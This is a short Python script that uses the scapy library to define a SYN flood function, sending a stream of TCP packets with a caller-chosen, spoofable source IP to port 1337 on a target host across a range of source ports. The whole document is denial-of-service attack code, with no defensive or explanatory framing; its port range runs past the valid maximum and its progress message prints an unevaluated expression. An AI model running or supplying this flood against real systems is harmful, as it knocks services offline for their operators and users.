#!/usr/bin/python

import click
from scapy.all import IP, TCP, send

def syn_flood(srcip:str,dstip:str):
    for sport in range(1024,66535):
        packet_number = sport - 1023
        L3 = IP(src=srcip, dst=dstip)
        L4 = TCP(sport=sport, dport=1337)
        pkt = L3/L4
        send(pkt)
        click.echo(f'{packet_number}/(66535-1024) packets left')